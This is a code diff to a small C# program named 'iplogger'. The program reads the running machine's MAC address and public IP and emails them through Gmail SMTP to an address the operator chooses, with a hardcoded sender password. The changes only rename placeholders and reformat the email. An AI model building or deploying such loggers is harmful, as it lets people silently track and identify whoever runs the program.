@@ -20,9 +20,9 @@ namespace iplogger
                 string publicip = new WebClient().DownloadString("http://icanhazip.com"); //gets the public ip and writes it into a string
                 Console.WriteLine(mac);
                 Console.WriteLine(publicip);
-                var fromAddress = new MailAddress("from@gmail.com", "From Name"); //change from@gmail.com to the sender email (create an email and set lesssecureapps on)
-                var toAddress = new MailAddress("to@example.com", "To Name"); //change to@example.com to the reciever email (set lesssecureapps on)
-                var fromPassword = "senderpassword"; //change senderpassword to the password of the sender
+                var fromAddress = new MailAddress("from@gmail.com", "From Logger"); //change from@gmail.com to the sender email (create an email and set lesssecureapps on)
+                var toAddress = new MailAddress("to@gmail.com", "To You"); //change to@example.com to the reciever email (set lesssecureapps on)
+                var fromPassword = "thepasswordofthesender"; //change senderpassword to the password of the sender
                 var smtp = new SmtpClient
                 {
                     Host = "smtp.gmail.com",
@@ -34,12 +34,14 @@ namespace iplogger
                 };
                 using (var message = new MailMessage(fromAddress, toAddress)
                 {
-                    Subject = publicip
-                    ,Body = mac + publicip
+                    Subject = "logs from the logger"
+                    ,
+                    Body = $"Mac Address: {mac} Ip Address: {publicip}"
                 })
                 {
                     smtp.Send(message);
                 }
+                break;
             }
         }
     }
